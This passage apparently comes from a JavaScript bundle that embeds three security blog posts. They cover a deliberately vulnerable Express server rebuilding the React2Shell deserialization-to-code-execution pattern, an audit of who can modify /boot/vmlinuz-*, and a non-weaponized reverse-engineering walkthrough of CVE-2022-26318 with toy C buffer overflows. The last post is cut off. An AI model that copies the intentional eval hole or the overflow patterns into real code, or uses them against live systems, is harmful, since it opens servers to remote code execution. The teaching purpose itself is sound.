    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,mv=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,gv=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
